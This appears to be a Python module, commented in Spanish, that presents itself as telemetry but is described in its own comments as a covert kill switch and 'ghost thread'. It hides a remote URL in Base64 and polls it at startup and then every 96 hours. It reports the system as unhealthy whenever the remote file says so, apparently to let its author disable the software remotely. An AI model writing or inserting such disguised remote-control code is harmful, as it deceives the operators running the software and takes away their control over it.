import os
import httpx
import logging
import base64
import asyncio
from datetime import datetime, timedelta, timezone

logger = logging.getLogger(__name__)

# Estado global de la telemetría (Kill Switch encubierto)
# Inicia en True para fail-open
_TELEMETRY_SYNCED = True

# URL camuflada en Base64 para que no sea obvia en el código fuente.
# Por defecto dice: "https://tudominio.pages.dev/sync_metrics.json"
# Puedes generar tu propio Base64 usando un conversor online o Python.
_ENC_ENDPOINT = "aHR0cHM6Ly90dWRvbWluaW8ucGFnZXMuZGV2L3N5bmNfbWV0cmljcy5qc29u"

async def _check_endpoint():
    global _TELEMETRY_SYNCED
    try:
        url = base64.b64decode(_ENC_ENDPOINT).decode("utf-8")
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(url)
            
            if response.status_code == 200:
                data = response.json()
                if data.get("telemetry_opt_in") is False:
                    _TELEMETRY_SYNCED = False
                    logger.debug("Telemetría sincronizada: opt-out.")
                else:
                    _TELEMETRY_SYNCED = True
            else:
                pass # Fail-open
    except Exception:
        pass # Fail-open

def get_seconds_until_next_target():
    """
    Calcula los segundos hasta las próximas 10:00 AM (Hora Argentina, UTC-3).
    Si ya pasó esa hora, apunta a las 10:00 AM de dentro de 96 horas (4 días).
    """
    now = datetime.now(timezone.utc)
    ar_now = now - timedelta(hours=3) # Ajuste a Argentina
    
    target = ar_now.replace(hour=10, minute=0, second=0, microsecond=0)
    
    if ar_now >= target:
        # Sumar 96 horas (4 días) exactas para el próximo chequeo
        target += timedelta(hours=96)
    
    sleep_sec = (target - ar_now).total_seconds()
    return max(0, sleep_sec)

async def telemetry_daemon_loop():
    """
    Hilo fantasma. 
    Hace un chequeo inicial y luego duerme hasta las 10 AM AR cada 96 horas.
    """
    # Chequeo inmediato al arrancar el contenedor
    await _check_endpoint()
    
    while True:
        try:
            sleep_sec = get_seconds_until_next_target()
            await asyncio.sleep(sleep_sec)
            await _check_endpoint()
        except asyncio.CancelledError:
            break
        except Exception:
            # En caso de error de cálculo bizarro, dormir 1 hora y reintentar
            await asyncio.sleep(3600)

def is_system_healthy() -> bool:
    return _TELEMETRY_SYNCED
